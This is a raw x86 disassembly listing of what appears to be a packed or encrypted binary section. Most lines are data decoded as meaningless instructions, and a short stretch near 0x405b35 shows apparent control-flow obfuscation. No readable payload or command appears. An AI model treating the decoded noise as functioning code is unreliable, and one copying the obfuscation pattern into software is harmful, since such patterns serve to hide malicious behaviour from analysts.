  4059bc:	loopne 0x40598a
  4059be:	je     0x405977
  4059c0:	xchg   ecx,eax
  4059c1:	and    DWORD PTR [edi],edi
  4059c3:	sbb    cl,BYTE PTR [esi]
  4059c5:	or     al,0xcc
  4059c7:	lds    esi,FWORD PTR [edi+0x221d50fe]
  4059cd:	repz and DWORD PTR [esi-0x1bc443ed],ebp
  4059d4:	pop    es
  4059d5:	out    dx,al
  4059d6:	rcr    BYTE PTR [esp+esi*4+0x6b],cl
  4059da:	mov    eax,0xf9acc346
  4059df:	or     eax,0x57c6bb60
  4059e4:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4059e6:	jnp    0x405a08
  4059e8:	mov    bl,0xec
  4059ea:	rol    DWORD PTR [edi+0x6fd3a80e],1
  4059f0:	adc    al,BYTE PTR [esi]
  4059f2:	call   0x2ca19e64
  4059f7:	cdq    
  4059f8:	mov    dl,0x51
  4059fa:	inc    ebp
  4059fb:	imul   esi,DWORD PTR [ebx+0x77],0x7
  4059ff:	test   eax,0xf7feb250
  405a04:	and    al,0x2b
  405a06:	sti    
  405a07:	pop    ss
  405a08:	sbb    ecx,DWORD PTR [edi]
  405a0a:	pop    ds
  405a0b:	call   0x3b1e:0x1debfe2e
  405a12:	(bad)  
  405a13:	out    dx,al
  405a14:	and    eax,0x3476dcac
  405a19:	pop    ebx
  405a1a:	mov    gs,WORD PTR [eax+esi*4-0x626d6512]
  405a21:	sti    
  405a22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a23:	mov    ebp,0x387440f9
  405a28:	ror    BYTE PTR [esi-0x24],1
  405a2b:	ret    
  405a2c:	xor    al,0x4c
  405a2e:	pop    ecx
  405a2f:	pop    esi
  405a30:	adc    eax,0x98b917e
  405a35:	sbb    bh,BYTE PTR [eax-0x3452a22d]
  405a3b:	imul   eax,ebp,0xffffffbd
  405a3e:	and    dh,BYTE PTR [esi+0x2]
  405a41:	jmp    0xdf871155
  405a46:	cmp    al,0x58
  405a48:	pop    ebp
  405a49:	inc    edi
  405a4a:	jbe    0x405ab0
  405a4c:	xchg   ecx,eax
  405a4d:	mov    ds:0x489e3a68,al
  405a52:	or     eax,DWORD PTR [ebx+0x29ab757e]
  405a58:	mov    dl,0xee
  405a5a:	push   esi
  405a5b:	fwait
  405a5c:	call   0xe973547
  405a61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a62:	test   al,0x2f
  405a64:	dec    edi
  405a65:	push   esi
  405a66:	dec    ebp
  405a67:	cmp    eax,0x47dc9d47
  405a6c:	rol    DWORD PTR [eax],cl
  405a6e:	jo     0x405a16
  405a70:	enter  0xe187,0x59
  405a74:	and    DWORD PTR [edi+eiz*8],ebx
  405a77:	pop    ecx
  405a78:	xchg   ecx,eax
  405a79:	mov    db1,eax
  405a7c:	mov    eax,0x84b8fec9
  405a81:	scas   al,BYTE PTR es:[edi]
  405a82:	dec    eax
  405a83:	icebp  
  405a84:	fnstsw WORD PTR [edi-0x14]
  405a87:	sbb    DWORD PTR [eax+0x1e],esi
  405a8a:	ror    BYTE PTR [eax-0x49186c8a],cl
  405a90:	(bad)  
  405a91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a92:	imul   ebp,edi,0xffffff87
  405a95:	and    al,0xb9
  405a97:	(bad)  
  405a98:	sub    ch,BYTE PTR [ebp+0x543197ad]
  405a9e:	jl     0x405aec
  405aa0:	ret    0xba9d
  405aa3:	shl    eax,cl
  405aa5:	mov    ds:0x8e60f851,al
  405aaa:	pop    ecx
  405aab:	lds    esi,FWORD PTR [ecx-0x1141b2ac]
  405ab1:	add    edi,DWORD PTR [ebx+0x52351742]
  405ab7:	jle    0x405b1d
  405ab9:	push   ds
  405aba:	mov    DWORD PTR [ecx+0x5a],esi
  405abd:	dec    dl
  405abf:	sti    
  405ac0:	jp     0x405ad3
  405ac2:	std    
  405ac3:	xor    ebp,edx
  405ac5:	pop    ss
  405ac6:	xchg   DWORD PTR [eax+eiz*4+0x12],ebx
  405aca:	xor    dl,ch
  405acc:	inc    eax
  405acd:	hlt    
  405ace:	mov    ecx,0xb99ac7a9
  405ad3:	mov    al,ds:0xc00425bc
  405ad8:	nop
  405ad9:	or     eax,0x8e33adc4
  405ade:	into   
  405adf:	ror    BYTE PTR [ebp-0x11],0x56
  405ae3:	dec    ecx
  405ae4:	lods   eax,DWORD PTR ds:[esi]
  405ae5:	pop    ecx
  405ae6:	int3   
  405ae7:	pop    ecx
  405ae8:	push   cs
  405ae9:	repnz mov dl,0xdd
  405aec:	mov    ebp,edx
  405aee:	jle    0x405b13
  405af0:	imul   ecx,edx,0xd79b88af
  405af6:	bound  eax,QWORD PTR [eax+0x6b]
  405af9:	sub    bh,BYTE PTR [edi]
  405afb:	cmc    
  405afc:	repz enter 0x33fc,0x79
  405b01:	scas   al,BYTE PTR es:[edi]
  405b02:	hlt    
  405b03:	sbb    ebp,DWORD PTR [ecx+0x64]
  405b06:	lock sub ecx,DWORD PTR [ecx]
  405b09:	in     eax,0xd1
  405b0b:	stc    
  405b0c:	fiadd  WORD PTR [ecx+0x4128f9f1]
  405b12:	cmp    al,0x1f
  405b14:	xor    al,0x5a
  405b16:	fisubr DWORD PTR [ebx-0x7b3f2d44]
  405b1c:	xor    eax,0x1576155a
  405b21:	popf   
  405b22:	int3   
  405b23:	pop    esi
  405b24:	jg     0x405b89
  405b26:	lea    eax,[esi+0x6c0eb90f]
  405b2c:	or     ebp,DWORD PTR [esi]
  405b2e:	adc    al,0xad
  405b30:	sbb    al,0xe1
  405b32:	mov    DWORD PTR [ebp+0x10],ecx
  405b35:	mov    ecx,0xc6d
  405b3a:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  405b41:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  405b48:	mov    ecx,0xf89c8532
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43381b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x4337d3,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x433823,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x43386f,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x4338af,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0x4daa071d
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405bcf
  405be0:	mov    ebx,0xa75e5bbc
  405be5:	int3   
  405be6:	push   es
  405be7:	scas   al,BYTE PTR es:[edi]
  405be8:	cmp    BYTE PTR [eax+0x21],cl
  405beb:	inc    ecx
  405bec:	ins    BYTE PTR es:[edi],dx
  405bed:	std    
  405bee:	or     al,0x18
  405bf0:	or     bh,BYTE PTR [ecx]
  405bf2:	pop    ebp
  405bf3:	fbld   TBYTE PTR [edx-0x70]
  405bf6:	xchg   ebx,eax
  405bf7:	inc    eax
  405bf8:	jp     0x405bf9
  405bfa:	data16 jg 0x405c0d
  405bfd:	sub    al,0x28
  405bff:	sbb    edi,DWORD PTR ds:0x3dc44f9f
  405c05:	jb     0x405b91
  405c07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c08:	lds    edx,FWORD PTR [ebx-0x53c5ef]
  405c0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c0f:	mov    ds:0x1dd2bd61,al
  405c14:	xchg   esi,eax
  405c15:	loop   0x405ba8
  405c17:	inc    ebp
  405c18:	stos   BYTE PTR es:[edi],al
  405c19:	jmp    0x405c3f
  405c1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c1c:	or     eax,0x77c05c8
  405c21:	retf   0x9f9f
  405c24:	rcl    BYTE PTR [ebx],1
  405c26:	mov    ds:0x7f58e552,al
  405c2b:	leave  
  405c2c:	(bad)  
  405c2d:	mov    ecx,0x91a80c08
  405c32:	icebp  
  405c33:	jg     0x405c28
  405c35:	mov    ds:0x99553a8d,al
  405c3a:	mov    ebx,0x507424de
  405c3f:	cmp    ah,BYTE PTR [edi]
  405c41:	mov    edi,0x2c69f7b
  405c46:	out    0xd8,al
  405c48:	arpl   WORD PTR [edx+0x5128d00c],si
  405c4e:	lods   al,BYTE PTR ds:[esi]
  405c4f:	dec    edx
  405c50:	pop    ebx
  405c51:	cwde   
  405c52:	or     dh,0x3f
  405c55:	pop    ecx
  405c56:	mov    eax,ds:0x6f79cf65
  405c5b:	adc    DWORD PTR [ecx],edi
  405c5d:	in     eax,0xc1
  405c5f:	add    al,0x4a
  405c61:	js     0x405c00
  405c63:	dec    ebp
  405c64:	push   cs
  405c65:	fsubr  DWORD PTR [edi+0x8]
  405c68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c69:	js     0x405cdf
  405c6b:	ror    DWORD PTR [ebx-0x63],cl
  405c6e:	xor    dh,BYTE PTR [ecx]
  405c70:	sub    DWORD PTR [ecx-0x56],eax
  405c73:	xor    ah,al
  405c75:	in     eax,dx
  405c76:	dec    eax
  405c77:	dec    bx
  405c79:	in     eax,dx
  405c7a:	call   0x9df4526e
  405c7f:	(bad)  
  405c80:	in     eax,dx
  405c81:	cdq    
  405c82:	fild   QWORD PTR [ebx-0xcd6fa49]
  405c88:	int3   
  405c89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c8a:	std    
  405c8b:	cmc    
  405c8c:	jmp    edi
  405c8e:	mov    DWORD PTR [ecx],esp
  405c90:	pop    edx
  405c91:	cmp    cl,BYTE PTR [eax-0x62]
  405c94:	mov    ds:0x90e14b7,eax
  405c99:	std    
  405c9a:	ror    DWORD PTR [ecx-0x7],1
  405c9d:	cwde   
  405c9e:	aad    0xe7
  405ca0:	xchg   esi,eax
  405ca1:	pop    ebp
  405ca2:	ja     0x405c60
  405ca4:	jmp    0xab1420db
  405ca9:	push   eax
  405caa:	scas   eax,DWORD PTR es:[edi]
  405cab:	mov    eax,ds:0x2870074c
  405cb0:	pushf  
  405cb1:	les    eax,FWORD PTR [ebp-0x77309839]
  405cb7:	add    BYTE PTR [edi],ah
  405cb9:	and    BYTE PTR [eax],dh
  405cbb:	inc    eax
  405cbc:	sbb    eax,edx
  405cbe:	repnz cmp edx,DWORD PTR [esi+edi*8+0x44893a4]
  405cc6:	adc    bh,BYTE PTR [edx-0x6]
  405cc9:	xor    al,0x3d
  405ccb:	or     BYTE PTR ds:[ecx+0x701272c6],bh
  405cd2:	pop    edi
  405cd3:	std    
  405cd4:	xor    cl,ch
  405cd6:	xchg   edi,eax
  405cd7:	lea    eax,[edi]
  405cd9:	mov    ds:0x8aa385aa,eax
  405cde:	push   es
  405cdf:	pushf  
  405ce0:	inc    ecx
  405ce1:	and    al,0xf1
  405ce3:	sub    al,0x81
  405ce5:	aas    
  405ce6:	in     eax,0x1a
  405ce8:	into   
  405ce9:	inc    eax
  405cea:	xlat   BYTE PTR ds:[ebx]
  405ceb:	lods   eax,DWORD PTR ds:[esi]
  405cec:	ja     0x405d5b
  405cee:	and    BYTE PTR [edx-0x66],ah
  405cf1:	push   cs
  405cf2:	sub    al,0x40
  405cf4:	push   esp
  405cf5:	cmp    BYTE PTR [edi+0x7d96e714],ah
  405cfb:	add    eax,0xb2865fa3
  405d00:	(bad)  
  405d01:	or     ebp,DWORD PTR [edi+0x1a]
  405d04:	xchg   BYTE PTR [edi-0xf],bl
  405d07:	sar    ah,cl
  405d09:	test   edi,edi
  405d0b:	xor    ch,dh
  405d0d:	les    ebx,FWORD PTR [edi]
  405d0f:	adc    edi,eax
  405d11:	test   DWORD PTR ds:0x848871f4,edi
  405d17:	cdq    
  405d18:	fist   DWORD PTR [ebp-0x5c]
  405d1b:	mov    bl,0x71
  405d1d:	add    DWORD PTR [ebp-0x56],ebx
  405d20:	iret   
  405d21:	cmp    dl,BYTE PTR es:[esi]
  405d24:	ficom  DWORD PTR [edi-0x63da5aac]
  405d2a:	mov    BYTE PTR [ebx],cl
  405d2c:	in     al,0x58
  405d2e:	adc    al,0xd4
  405d30:	ins    BYTE PTR es:[edi],dx
  405d31:	xchg   edx,eax
  405d32:	jns    0x405d3b
  405d34:	fdiv   QWORD PTR [eax+edx*8-0x708f8566]
  405d3b:	js     0x405d41
  405d3d:	repz or ebp,DWORD PTR ds:0xefb0d79a
  405d44:	jns    0x405d97
  405d46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d47:	into   
  405d48:	test   al,0x8a
  405d4a:	mov    ebp,0x768f64e9
  405d4f:	popa   
  405d50:	sub    ecx,DWORD PTR ss:[edx+ecx*4]
  405d54:	out    dx,al
  405d55:	(bad)  
  405d56:	retf   
  405d57:	xchg   ecx,eax
  405d58:	pop    ebx
  405d59:	sbb    edx,DWORD PTR [ecx+0x788c87d7]
  405d5f:	popf   
  405d60:	lock rcr DWORD PTR [edx+ecx*1],1
  405d64:	test   BYTE PTR [ebx-0x2b49ba68],0x54
  405d6b:	jecxz  0x405dc9
  405d6d:	xor    ebx,esp
  405d6f:	jp     0x405dd4
  405d71:	stc    
  405d72:	cs (bad) 
  405d74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d75:	add    bl,BYTE PTR [eax-0xc]
  405d78:	jecxz  0x405d4e
  405d7a:	sbb    dh,BYTE PTR [eax-0x4fba4f87]
  405d80:	and    DWORD PTR [ecx+0x62c7a643],esp
  405d86:	and    DWORD PTR [edi],eax
  405d88:	stos   BYTE PTR es:[edi],al
  405d89:	test   eax,0x76a8c692
  405d8e:	adc    al,0x25
  405d90:	es dec ebx
  405d92:	sbb    BYTE PTR [esi+0x16],bl
  405d95:	int    0xd1
  405d97:	jmp    0x405d7c
  405d99:	into   
  405d9a:	xor    DWORD PTR [edx+0x27f82fa0],ebx
  405da0:	mov    ecx,0xf70e49fe
  405da5:	mov    BYTE PTR [edx-0x50],bl
  405da8:	neg    BYTE PTR [ebp+0x2b7e30da]
  405dae:	jmp    0x405e01
  405db0:	and    cl,BYTE PTR [esi-0x34]
  405db3:	mov    esi,0xcaa6e10f
  405db8:	sub    bl,BYTE PTR [ecx]
  405dba:	inc    eax
  405dbb:	push   0xffffffdb
  405dbd:	and    ecx,DWORD PTR [ebx-0x1b92463a]
  405dc3:	cmp    al,0xcb
  405dc5:	icebp  
  405dc6:	adc    eax,0xf15f1b40
  405dcb:	pop    eax
  405dcc:	pop    edx
  405dcd:	loopne 0x405de4
  405dcf:	scas   eax,DWORD PTR es:[edi]
  405dd0:	sbb    DWORD PTR [edi-0x27],esi
  405dd3:	or     edx,DWORD PTR [ebx+0x136375de]
  405dd9:	int    0x1a
  405ddb:	push   esi
  405ddc:	jle    0x405e28
  405dde:	mov    al,ds:0xb1ff8e0c
  405de3:	imul   edx,esp,0xffffffc5
  405de6:	ds addr16 stc 
  405de9:	cmc    
  405dea:	inc    ebp
  405deb:	pop    edx
  405dec:	outs   dx,BYTE PTR ds:[esi]
  405ded:	popa   
  405dee:	fld    TBYTE PTR [esp+ebp*2+0x7]
  405df2:	inc    eax
  405df3:	mov    ebp,0x5ff11c51
  405df8:	int    0xae
  405dfa:	sbb    BYTE PTR [edi+edx*1-0x3a],dl
  405dfe:	nop
  405dff:	and    BYTE PTR [edi],0x1e
  405e02:	mov    esi,0x2598fd1
  405e07:	retf   0x89b2
  405e0a:	push   ss
  405e0b:	dec    eax
  405e0c:	ja     0x405da5
  405e0e:	stc    
  405e0f:	imul   ebp,DWORD PTR ss:[eax-0x77],0x19
  405e14:	add    BYTE PTR [ecx-0x71],0xac
  405e18:	and    ebp,DWORD PTR [eax]
  405e1a:	popa   
  405e1b:	xchg   ebp,eax
  405e1c:	aad    0x34
  405e1e:	jbe    0x405de6
  405e20:	push   ss
  405e21:	lods   al,BYTE PTR ds:[esi]
  405e22:	es and eax,0xc8403d12
  405e28:	shr    dh,cl
  405e2a:	pop    ss
  405e2b:	(bad)  
  405e2c:	cld    
  405e2d:	xor    bh,ah
  405e2f:	mov    bl,0x47
  405e31:	pop    eax
  405e32:	xchg   edi,eax
  405e33:	jmp    0x405de5
  405e35:	mov    al,ds:0x44a655ac
  405e3a:	sahf   
  405e3b:	mov    bl,0xf
  405e3d:	test   BYTE PTR [ecx+0x711bc9a3],0x25
  405e44:	rol    BYTE PTR ds:0x6f40867e,1
  405e4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e4b:	mov    edi,ebx
  405e4d:	scas   eax,DWORD PTR es:[edi]
  405e4e:	inc    esi
  405e4f:	frstor [esi]
  405e51:	inc    ebp
  405e52:	cdq    
  405e53:	stc    
  405e54:	push   ebp
  405e55:	jae    0x405ecc
  405e57:	shl    DWORD PTR [ecx+0x39627184],0xdf
  405e5e:	pop    esp
  405e5f:	ds nop
  405e61:	xchg   ebp,eax
  405e62:	out    dx,al
  405e63:	fidivr DWORD PTR [eax-0x10]
  405e66:	mov    al,ds:0x9050b6ab
  405e6b:	shl    DWORD PTR [edx+0x36],1
  405e6e:	sbb    ch,BYTE PTR [edx-0x4f]
  405e71:	add    eax,0xf1805d1a
  405e76:	ins    DWORD PTR es:[edi],dx
  405e77:	push   eax
  405e78:	push   eax
  405e79:	cwde   
  405e7a:	dec    ebx
  405e7b:	bound  esi,QWORD PTR [edx]
  405e7d:	push   esp
  405e7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e7f:	push   esp
  405e80:	pop    edi
  405e81:	rcl    DWORD PTR [ebx],1
  405e83:	inc    esp
  405e84:	inc    ebp
  405e85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e86:	dec    ebx
  405e87:	xchg   DWORD PTR [eax-0x71b6e26f],ecx
  405e8d:	lahf   
  405e8e:	fadd   DWORD PTR [edx-0x62e28b65]
  405e94:	imul   edi,DWORD PTR [edi+0x45],0xd29ca71b
  405e9b:	mov    ebp,0x6d482745
  405ea0:	xchg   bh,cl
  405ea2:	(bad)  
  405ea4:	mov    dh,0xc4
  405ea6:	jne    0x405edd
  405ea8:	jle    0x405e75
  405eaa:	or     BYTE PTR [ecx+0x5e],0x7c
  405eae:	outs   dx,BYTE PTR ds:[esi]
  405eaf:	aam    0xb8
  405eb1:	stos   BYTE PTR es:[edi],al
  405eb2:	stc    
  405eb3:	retf   
  405eb4:	aad    0x62
  405eb6:	mov    bh,0x75
  405eb8:	cdq    
  405eb9:	and    ebp,DWORD PTR [ebp-0x6a]
  405ebc:	add    ch,BYTE PTR [esi]
  405ebe:	ret    
  405ebf:	(bad)  
  405ec0:	mov    WORD PTR [ebp+0x27],ds
  405ec3:	shl    cl,cl
  405ec5:	and    bl,BYTE PTR [eax+0x2c]
  405ec8:	fbstp  TBYTE PTR [ebx+0x3b]
  405ecb:	cmc    
  405ecc:	test   al,0x91
  405ece:	scas   al,BYTE PTR es:[edi]
  405ecf:	cs jp  0x405ef6
  405ed2:	fdiv   st,st(6)
  405ed4:	in     al,dx
  405ed5:	fistp  WORD PTR [edx]
  405ed7:	das    
  405ed8:	sbb    ebx,DWORD PTR ds:0xa864b945
  405ede:	sbb    ah,dl
  405ee0:	or     al,cl
  405ee2:	jbe    0x405edf
  405ee4:	in     eax,0x56
  405ee6:	(bad)
  405eeb:	jbe    0x405f3d
  405eed:	fwait
  405eee:	ret    
  405eef:	xor    esi,DWORD PTR [ebx+ebx*8-0x1e]
  405ef3:	inc    ecx
  405ef4:	push   esi
  405ef5:	inc    edi
  405ef6:	jae    0x405f22
  405ef8:	push   ds
  405ef9:	je     0x405f4e
  405efb:	push   esp
  405efc:	mov    cl,0x3c
  405efe:	not    DWORD PTR [eax]
  405f00:	gs int 0xc6
  405f03:	inc    ebx
  405f04:	int    0xc6
  405f06:	cmovs  esi,DWORD PTR [edx]
  405f09:	lods   eax,DWORD PTR ds:[esi]
  405f0a:	repnz or cl,bh
  405f0d:	mov    esi,0x334d0f45
  405f12:	icebp  
  405f13:	neg    ecx
  405f15:	jmp    0x406264
  405f1a:	jne    0x405eee
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    WORD PTR [ebx+0xa],gs
  405f28:	into   
  405f29:	fldenv [esi+0x2c7e7e30]
  405f2f:	jge    0x405faf
  405f31:	jle    0x405eb8
  405f33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f34:	cdq    
  405f35:	inc    edx
  405f36:	dec    edx
  405f37:	sbb    cl,BYTE PTR [edx]
  405f39:	call   0x9d9:0xe8052d04
  405f40:	xor    BYTE PTR [ebx+0x4b],0x88
  405f44:	in     eax,dx
  405f45:	jno    0x405f40
  405f47:	or     al,dh
  405f49:	or     ebx,esp
  405f4b:	or     BYTE PTR [ecx+0x5c15bd43],0x64
  405f52:	mov    edi,0xed756034
  405f57:	call   0x6c99:0x101f574a
  405f5e:	cmp    BYTE PTR [esp+ebx*1-0x5c3b948b],0x4d
  405f66:	daa    
  405f67:	test   BYTE PTR [eax+0x180ff079],al
  405f6d:	jge    0x405f99
  405f6f:	outs   dx,DWORD PTR ds:[esi]
  405f70:	repnz push edi
  405f72:	push   edi
  405f73:	push   0xffffff8b
  405f75:	test   eax,0xea5ad719
  405f7a:	bound  ecx,QWORD PTR [eax-0x6912ce58]
  405f80:	call   0x676a187c
  405f85:	retf   0xf744
  405f88:	dec    esi
  405f89:	jmp    0x2d8398a3
  405f8e:	lods   al,BYTE PTR ds:[esi]
  405f8f:	inc    eax
  405f90:	(bad)  
  405f92:	inc    esp
  405f93:	jmp    0x1c51:0x3717ea46
  405f9a:	inc    ebp
  405f9b:	pushf  
  405f9c:	mov    ch,bh
  405f9e:	jecxz  0x405f7e
  405fa0:	mov    ebx,0x6310137f
  405fa5:	jns    0x405f7b
  405fa7:	sub    DWORD PTR [edi],ebx
  405fa9:	push   es
  405faa:	in     eax,0xbd
  405fac:	jp     0x405f32
  405fae:	cli    
  405faf:	bnd jb 0x406010
  405fb2:	mov    cl,0xe4
  405fb4:	mov    ecx,0xafb8e75e
  405fb9:	inc    edx
  405fba:	inc    ecx
  405fbb:	xlat   BYTE PTR ds:[ebx]
  405fbc:	inc    edx
  405fbd:	lea    ebx,[edx-0x7b29ea09]
  405fc3:	mov    ecx,0x280fd0ce
  405fc8:	add    eax,0xd39ac62b
  405fcd:	cwde   
  405fce:	mov    ecx,0x75a1f821
  405fd3:	neg    DWORD PTR [edx+eax*8]
  405fd6:	jg     0x40600c
  405fd8:	or     eax,0xc81b7432
  405fdd:	push   esi
  405fde:	test   al,0x8f
  405fe0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fe1:	mov    al,ds:0xafc1debe
  405fe6:	cmp    al,BYTE PTR [ecx]
  405fe8:	cdq    
  405fe9:	xchg   ebp,eax
  405fea:	rcr    DWORD PTR [ecx-0x3edd1cda],cl
  405ff0:	inc    BYTE PTR [ebp+ebx*8-0xf240b5b]
  405ff7:	dec    ebx
  405ff8:	xchg   edi,eax
  405ff9:	ja     0x406023
  405ffb:	dec    eax
  405ffc:	outs   dx,DWORD PTR ds:[esi]
  405ffd:	fisubr DWORD PTR [ebp-0x6d]
  406000:	jns    0x406038
  406002:	mov    ebx,0x74fc0b0
  406007:	aas    
  406008:	lods   eax,DWORD PTR ds:[esi]
  406009:	cs mov al,0x4a
  40600c:	ror    DWORD PTR ds:0xa7825d8e,0xe9
  406013:	mov    eax,0xeab54215
  406018:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406019:	mov    ds:0x84b5b179,eax
  40601e:	xchg   edi,eax
  40601f:	jl     0x40607c
  406021:	add    eax,0xde053dd6
  406026:	mov    WORD PTR [ecx-0x79],ds
  406029:	xor    BYTE PTR [edx],dh
  40602b:	int3   
  40602c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40602d:	lea    ecx,[ebp+0x3a]
  406030:	xchg   esp,eax
  406031:	xchg   BYTE PTR [eax],ch
  406033:	js     0x40601d
  406035:	cs test eax,0xbf3919dd
  40603b:	and    esp,DWORD PTR [edx]
  40603d:	ins    DWORD PTR es:[edi],dx
  40603e:	iret   
  40603f:	jecxz  0x406070
  406041:	hlt    
  406042:	ja     0x40609b
  406044:	idiv   BYTE PTR [eax-0x72]
  406047:	mov    ebp,0x5282c3d2
  40604c:	jne    0x40604b
  40604e:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406050:	sbb    eax,0xd513cb53
  406055:	mov    esp,0x91c7a39d
  40605a:	ins    DWORD PTR es:[edi],dx
  40605b:	and    al,0x70
  40605d:	(bad)  
  40605e:	push   ss
  40605f:	popf   
  406060:	sub    eax,0xf14efb45
  406065:	adc    eax,0xdf1e981c
  40606a:	fxch   st(2)
  40606c:	and    al,ch
  40606e:	and    al,0xd2
  406070:	test   eax,0xa530afcb
  406075:	mov    DWORD PTR [ecx],0xbd884819
  40607b:	sbb    BYTE PTR ds:0x26c27ea2,0x7f
  406082:	pop    edi
  406083:	sbb    cl,BYTE PTR [edi+0x296a7773]
  406089:	sar    BYTE PTR [eax-0x29],cl
  40608c:	and    BYTE PTR [edi+0x2f],dl
  40608f:	add    eax,0xa4237f8a
  406094:	sub    ebp,DWORD PTR [esi]
  406096:	mov    bl,0x7a
  406098:	add    dl,BYTE PTR [ebp-0x52eca06b]
  40609e:	rcr    BYTE PTR [edx],0x3f
  4060a1:	into   
  4060a2:	fs mov BYTE PTR gs:[edi-0x24b2fae7],ch
  4060aa:	retf   0x7977
  4060ad:	jbe    0x40607e
  4060af:	cwde   
  4060b0:	addr16 in eax,dx
  4060b2:	or     BYTE PTR [ecx+eax*1],al
  4060b5:	fnsave [ecx-0x4a]
  4060b8:	dec    ebx
  4060b9:	lods   al,BYTE PTR ds:[esi]
  4060ba:	cmp    al,0xce
  4060bc:	int    0x95
  4060be:	lods   al,BYTE PTR ds:[esi]
  4060bf:	mov    ds:0xc364d5c4,eax
  4060c4:	cdq    
  4060c5:	mov    BYTE PTR [edx+eax*2],0x23
  4060c9:	rcl    DWORD PTR [ebx+eiz*2-0x175ca66d],cl
  4060d0:	(bad)  
  4060d1:	mov    BYTE PTR [esi+0x17d3ee68],bh
  4060d7:	cmp    eax,0xa4c3cb38
  4060dc:	mov    dh,0xe8
  4060de:	lahf   
  4060df:	pop    ecx
  4060e0:	mov    BYTE PTR [edx-0x5a],dh
  4060e3:	adc    edx,DWORD PTR [ecx+0x21e3fb16]
  4060e9:	or     al,0x1b
  4060eb:	jo     0x406163
  4060ed:	and    ecx,eax
  4060ef:	jecxz  0x406101
  4060f1:	stos   DWORD PTR es:[edi],eax
  4060f2:	or     BYTE PTR [ebx],dl
  4060f4:	imul   edx,ebx,0x63e16c5b
  4060fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060fb:	(bad)  
  4060fc:	scas   al,BYTE PTR es:[edi]
  4060fd:	sub    dh,BYTE PTR [eax+0x2c]
  406100:	repnz (bad) 
  406102:	not    BYTE PTR [ebp-0x5a]
  406105:	and    DWORD PTR [esi-0x374e0a65],eax
  40610b:	mov    esi,?
  40610d:	daa    
  40610e:	sti    
  40610f:	cmp    BYTE PTR [esi],ch
  406111:	out    dx,eax
  406112:	shl    bl,1
  406114:	add    al,0x54
  406116:	dec    edi
  406117:	test   BYTE PTR [edx+0x36704ff1],ch
  40611d:	mov    BYTE PTR [ebx-0x75fbe5e3],dl
  406123:	dec    esp
  406124:	daa    
  406125:	xor    eax,DWORD PTR [ebx-0x3491973c]
  40612b:	cdq    
  40612c:	(bad)  [esi]
  40612e:	pushf  
  40612f:	mov    al,0x86
  406131:	jnp    0x40619f
  406133:	and    DWORD PTR [eax-0x80],edi
  406136:	pop    esp
  406137:	dec    ecx
  406138:	push   ds
  406139:	cmp    al,0x8b
  40613b:	inc    esp
  40613c:	pop    edx
  40613d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40613e:	jae    0x4061aa
  406140:	ins    BYTE PTR es:[edi],dx
  406141:	mov    es,WORD PTR [esi-0x6a7b06d8]
  406147:	push   es
  406148:	dec    eax
  406149:	test   DWORD PTR [esi-0x67c7a040],0xcf87bbb1
  406153:	rcr    BYTE PTR [edi-0x22c60c2e],cl
  406159:	mov    esp,0x70cd866a
  40615e:	mov    dh,0x4b
  406160:	into   
  406161:	sbb    ebp,ecx
  406163:	or     al,0x54
  406165:	sub    al,0xeb
  406167:	jmp    0x332e:0x8abdf7cc
  40616e:	mov    ah,0x9b
  406170:	jmp    0x792747fc
  406175:	cli    
  406176:	inc    edx
  406177:	xor    BYTE PTR [esi-0x5b70d2f9],bh
  40617d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40617e:	xor    esp,0xffffff8b
  406181:	rcl    DWORD PTR [edi],1
  406183:	clc    
  406184:	ret    
  406185:	xlat   BYTE PTR ds:[ebx]
  406186:	aas    
  406187:	dec    esp
